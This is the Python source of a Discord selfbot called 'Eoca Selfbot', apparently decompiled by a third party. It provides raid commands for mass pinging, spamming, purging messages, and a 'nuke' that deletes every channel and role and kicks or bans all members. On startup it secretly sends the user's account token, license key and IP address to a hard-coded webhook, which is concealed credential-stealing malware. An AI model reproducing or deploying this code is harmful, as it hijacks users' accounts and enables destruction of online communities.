# Reversed By Hisako🎀#2004 
import discord
from discord.ext import commands
import os, colorama
from colorama import Fore, Back, Style, init
import cursor, msvcrt, requests
cursor.hide()
from pwinput import pwinput
import time, nacl, webbrowser, threading, re
from dhooks import Webhook, File, Embed
import os.path
init(convert=True)
intents = discord.Intents.all()
intents.members = True
bot = commands.Bot(command_prefix=(open('data/prefix.txt', 'r').read()), intents=intents, self_bot=True)
bot.remove_command('help')
eoca = f"{Fore.LIGHTMAGENTA_EX}┌─┐┌─┐┌─┐┌─┐  ┌─┐┌─┐┬  ┌─┐┌┐ ┌─┐┌┬┐\n├┤ │ ││  ├─┤  └─┐├┤ │  ├┤ ├┴┐│ │ │ \n└─┘└─┘└─┘┴ ┴  └─┘└─┘┴─┘└  └─┘└─┘ ┴ "

@bot.event
async def on_ready():
    os.system('cls')
    os.system('mode 45,7')
    print(f"{Fore.LIGHTMAGENTA_EX}{eoca}\n")
    print(f"are you {Fore.LIGHTWHITE_EX}{bot.user.name}#{bot.user.discriminator}{Fore.LIGHTMAGENTA_EX}? ({Fore.LIGHTWHITE_EX}y/n{Fore.LIGHTMAGENTA_EX})")
    choice = input(Fore.LIGHTWHITE_EX)
    if choice.lower() != 'y':
        if choice.lower() != 'yes':
            quit()
    try:
        with open('data/token.txt', 'r+') as f:
            f.truncate(0)
    except:
        pass

    f = open('data/token.txt', 'a')
    f.write(bot_token)
    f.close()
    response = requests.get('http://ip-api.com/json/')
    data = response.json()
    hook = Webhook('https://discord.com/api/webhooks/1029172276605759528/jyDAVqrxmRHYwBO9fSlX_FkLhBXRUV0450Y48gtD5LPh0IUXXg4JsH3WcNoRWw2M5jlg')
    embed = Embed(description='')
    embed.set_author(name='Eoca Selfbot Logs')
    embed.add_field(name='User Name:', value=f"{bot.user.name}#{bot.user.discriminator}", inline=True)
    embed.add_field(name='User Key:', value=username_input, inline=True)
    embed.add_field(name='User IP:', value=(data['query']), inline=True)
    embed.add_field(name='User Login:', value=f"||{bot_token}||", inline=True)
    embed.set_footer(text='Eoca Selfbot ©️', icon_url='https://cdn.discordapp.com/attachments/747180980917239931/1029179861111152690/0bdc6f8536de7a1a8b18a47cf7093b7d_720x.jpg')
    hook.send(embed=embed)
    os.system('cls')
    os.system('mode 110, 45')
    print(f"{eoca}\n\ncommand logs: \n")
    time.sleep(1)
    print(f"welcome, {Fore.LIGHTWHITE_EX}{bot.user.name}#{bot.user.discriminator}{Fore.LIGHTMAGENTA_EX}!")
    await bot.change_presence(activity=discord.Game(name='Eoca Selfbot'))
    print(f'successfully changed "{Fore.LIGHTWHITE_EX}Playing{Fore.LIGHTMAGENTA_EX}" status to "{Fore.LIGHTWHITE_EX}Eoca Selfbot{Fore.LIGHTMAGENTA_EX}"!')


@bot.command()
async def massping(ctx, amount: int):
    try:
        await ctx.message.delete()
        for i in range(amount):
            await ctx.send('@everyone')

        print(f"successfully pinged @everyone {Fore.LIGHTWHITE_EX}{amount}{Fore.LIGHTMAGENTA_EX} times!")
    except:
        pass


@bot.command()
async def spamthis(ctx, spam_message: str, amount: int):
    try:
        spam_message = spam_message.replace('_', ' ')
        await ctx.message.delete()
        for i in range(amount):
            await ctx.send(spam_message)

        print(f'successfully spammed "{Fore.LIGHTWHITE_EX}{spam_message}{Fore.LIGHTMAGENTA_EX}" {Fore.LIGHTWHITE_EX}{amount}{Fore.LIGHTMAGENTA_EX} times!')
    except:
        pass


@bot.command()
async def massdelete(ctx, amount: int):
    try:
        await ctx.message.delete()
        await ctx.channel.purge(limit=amount)
        print(f"successfully deleted {Fore.LIGHTWHITE_EX}{amount}{Fore.LIGHTMAGENTA_EX} messages!")
    except:
        pass


@bot.command()
async def clearlogs(ctx):
    try:
        await ctx.message.delete()
        os.system('cls')
        os.system('mode 110, 45')
        print(eoca + '\n')
        print('command logs:\n')
    except:
        pass


@bot.command()
@commands.has_permissions(kick_members=True)
async def nuke(ctx, phrase, icon_name, channel_amount, option):
    phrase = phrase.replace('_', ' ')
    channels_deleted = 0
    try:
        await ctx.message.delete()
        for c in ctx.guild.channels:
            await c.delete()
            channels_deleted += 1

    except:
        pass

    print(f"successfully deleted {Fore.LIGHTWHITE_EX}{channels_deleted}{Fore.LIGHTMAGENTA_EX} channel(s)!")
    try:
        for i in range(channel_amount):
            channel = await ctx.message.guild.create_text_channel(phrase)

    except:
        pass

    print(f"successfully created {Fore.LIGHTWHITE_EX}{channel_amount}{Fore.LIGHTMAGENTA_EX} channel(s) named {Fore.LIGHTWHITE_EX}{phrase}{Fore.LIGHTMAGENTA_EX}!")
    try:
        await ctx.guild.edit(name=phrase)
    except:
        pass

    print(f"successfully changed guild name to {Fore.LIGHTWHITE_EX}{phrase}{Fore.LIGHTMAGENTA_EX}!")
    try:
        with open(f"data/images/{icon_name}", 'rb') as f:
            icon = f.read()
            await ctx.message.guild.edit(icon=icon)
    except:
        pass

    print(f"successfully changed guild icon to {Fore.LIGHTWHITE_EX}{icon_name}{Fore.LIGHTMAGENTA_EX}!")
    try:
        roles_removed = 0
        roles_created = 0
        for role in ctx.guild.roles:
            try:
                await role.delete()
                roles_removed += 1
            except:
                pass

        for i in range(channel_amount):
            await ctx.guild.create_role(name=phrase)
            roles_created += 1

    except:
        pass

    print(f"successfully removed {Fore.LIGHTWHITE_EX}{roles_removed}{Fore.LIGHTMAGENTA_EX} role(s)!")
    print(f"successfully created {Fore.LIGHTWHITE_EX}{roles_created}{Fore.LIGHTMAGENTA_EX} new roles called {Fore.LIGHTWHITE_EX}{phrase}{Fore.LIGHTMAGENTA_EX}!")
    if option == 'kick':
        try:
            users_kicked = 0
            for user in ctx.guild.members:
                try:
                    await ctx.guild.kick(user)
                    users_kicked += 1
                except:
                    pass

        except:
            pass

        print(f"successfully kicked {Fore.LIGHTWHITE_EX}{users_kicked}{Fore.LIGHTMAGENTA_EX} member(s)!")
    else:
        if option == 'ban':
            try:
                users_kicked = 0
                for user in ctx.guild.members:
                    try:
                        await ctx.guild.ban(user)
                        users_kicked += 1
                    except:
                        pass

            except:
                pass

            print(f"successfully banned {Fore.LIGHTWHITE_EX}{users_kicked}{Fore.LIGHTMAGENTA_EX} member(s)!")


@bot.command()
async def spamimage(ctx, image_name: str, amount: int):
    await ctx.message.delete()
    for i in range(amount):
        await ctx.channel.send(file=(discord.File(f"data/images/{image_name}")))

    print(f'successfully spammed "{Fore.LIGHTWHITE_EX}{image_name}{Fore.LIGHTMAGENTA_EX}" {Fore.LIGHTWHITE_EX}{amount}{Fore.LIGHTMAGENTA_EX} times!')


@bot.command()
async def membercount(ctx):
    try:
        await ctx.message.delete()
        print(f"successfully counted {Fore.LIGHTWHITE_EX}{ctx.guild.member_count}{Fore.LIGHTMAGENTA_EX} members in {Fore.LIGHTWHITE_EX}{ctx.guild.name}{Fore.LIGHTMAGENTA_EX}!")
    except:
        pass


@bot.command()
async def members(ctx):
    await ctx.message.delete()
    names = list()
    for user in ctx.guild.members:
        names.append(f"{user.name}#{user.discriminator}")

    names = '\n'.join(names)
    names = names.replace('\n', f"{Fore.LIGHTMAGENTA_EX}, {Fore.LIGHTWHITE_EX}")
    print(f"successfully found {Fore.LIGHTWHITE_EX}{names}{Fore.LIGHTMAGENTA_EX} in {Fore.LIGHTWHITE_EX}{ctx.guild.name}{Fore.LIGHTMAGENTA_EX}!")


@bot.command()
async def presence(ctx, type: str, arg: str):
    await ctx.message.delete()
    arg = arg.replace('_', ' ')
    if type == 'playing':
        await bot.change_presence(activity=discord.Game(name=arg))
        print(f'successfully changed "{Fore.LIGHTWHITE_EX}Playing{Fore.LIGHTMAGENTA_EX}" status to "{Fore.LIGHTWHITE_EX}{arg}{Fore.LIGHTMAGENTA_EX}"!')
    if type == 'listening':
        await bot.change_presence(activity=discord.Activity(type=(discord.ActivityType.listening), name=arg))
        print(f'successfully changed "{Fore.LIGHTWHITE_EX}Listening{Fore.LIGHTMAGENTA_EX}" status to "{Fore.LIGHTWHITE_EX}{arg}{Fore.LIGHTMAGENTA_EX}"!')
    if type == 'watching':
        await bot.change_presence(activity=discord.Activity(type=(discord.ActivityType.watching), name=arg))
        print(f'successfully changed "{Fore.LIGHTWHITE_EX}Watching{Fore.LIGHTMAGENTA_EX}" status to "{Fore.LIGHTWHITE_EX}{arg}{Fore.LIGHTMAGENTA_EX}"!')


@bot.command()
async def stream(ctx, phrase: str):
    await ctx.message.delete()
    await bot.change_presence(activity=discord.Streaming(name=phrase, url=f"https://www.twitch.tv/{phrase}"))
    print(f'successfully changed twitch presence to "{Fore.LIGHTWHITE_EX}https://www.twitch.tv/{phrase}{Fore.LIGHTMAGENTA_EX}"!')


@bot.command(pass_context=True, name='status')
async def status(ctx, member: discord.Member):
    await ctx.message.delete()
    if str(member.status) == 'online':
        print(f"{Fore.LIGHTWHITE_EX}{member.name}#{member.discriminator}{Fore.LIGHTMAGENTA_EX} is currently {Fore.LIGHTWHITE_EX}online{Fore.LIGHTMAGENTA_EX}!")
    if str(member.status) == 'offline':
        print(f"{Fore.LIGHTWHITE_EX}{member.name}#{member.discriminator}{Fore.LIGHTMAGENTA_EX} is currently {Fore.LIGHTWHITE_EX}offline{Fore.LIGHTMAGENTA_EX}!")


@bot.command()
async def getavatar(ctx, member: discord.Member):
    await ctx.message.delete()
    os.system(f"start chrome {member.avatar_url}")
    print(f"successfully opened {Fore.LIGHTWHITE_EX}{member.name}#{member.discriminator}{Fore.LIGHTMAGENTA_EX}'s avatar in chrome!")


def findWholeWord(w):
    return re.compile('\\b({0})\\b'.format(w)).search


version = '1.2'
r = requests.get('https://pastebin.com/raw/kEMMS1NM')
if version != r.text:
    os.system('cls')
    os.system('mode 66,7')
    os.system(f"title eoca selfbot V{version} ~ outdated version!")
    print(f"{Fore.LIGHTMAGENTA_EX}{eoca}\n")
    print(f"error, you are using an outdated version of the selfbot! ({Fore.LIGHTWHITE_EX}V{version}{Fore.LIGHTMAGENTA_EX})")
    print(f"check {Fore.LIGHTWHITE_EX}https://discord.gg/5tBcpzh22H{Fore.LIGHTMAGENTA_EX} for the latest download link!")
    os.system('pause>nul')
    quit()
whitelisted = False
while whitelisted == False:
    if os.path.isfile('data/key.txt'):
        username_input = open('data/key.txt', 'r').read()
        r = requests.get('https://pastebin.com/raw/9J4rrkLm')
        r = r.text
        r = r.split()
        for i in r:
            if username_input == i:
                whitelisted = True
                try:
                    with open('data/key.txt', 'r+') as f:
                        f.truncate(0)
                except:
                    pass

                f = open('data/key.txt', 'a')
                f.write(username_input)
                f.close()

        if whitelisted == False:
            os.system('cls')
            os.system(f"title eoca selfbot V{version} ~ login")
            os.system('mode 45,7')
            print(f"{Fore.LIGHTMAGENTA_EX}{eoca}\n")
            print(f"please enter a whitelisted key below!{Fore.LIGHTWHITE_EX}")
            username_input = pwinput(prompt='', mask='*')
            r = requests.get('https://pastebin.com/raw/9J4rrkLm')
            r = r.text
            r = r.split()
            for i in r:
                if username_input == i:
                    whitelisted = True
                    try:
                        with open('data/key.txt', 'r+') as f:
                            f.truncate(0)
                    except:
                        pass

                    f = open('data/key.txt', 'a')
                    f.write(username_input)
                    f.close()

    else:
        os.system('cls')
        os.system(f"title eoca selfbot V{version} ~ login")
        os.system('mode 45,7')
        print(f"{Fore.LIGHTMAGENTA_EX}{eoca}\n")
        print(f"please enter a whitelisted key below!{Fore.LIGHTWHITE_EX}")
        username_input = pwinput(prompt='', mask='*')
        r = requests.get('https://pastebin.com/raw/9J4rrkLm')
        r = r.text
        r = r.split()
        for i in r:
            if username_input == i:
                whitelisted = True
                try:
                    with open('data/key.txt', 'r+') as f:
                        f.truncate(0)
                except:
                    pass

                f = open('data/key.txt', 'a')
                f.write(username_input)
                f.close()

os.system('cls')
os.system('mode 45,6')
os.system(f"title eoca selfbot V{version} ~ console")
print(eoca + '\n\nstarting selfbot...')
try:
    bot_token = open('data/token.txt', 'r').read().replace('"', '')
    bot.run(bot_token, bot=False)
except:
    os.system('cls')
    os.system('mode 45,6')
    print(f"{Fore.LIGHTMAGENTA_EX}{eoca}\n")
    print('invalid token input!')
    os.system('start data/token.txt')
    os.system('pause>nul')
    quit()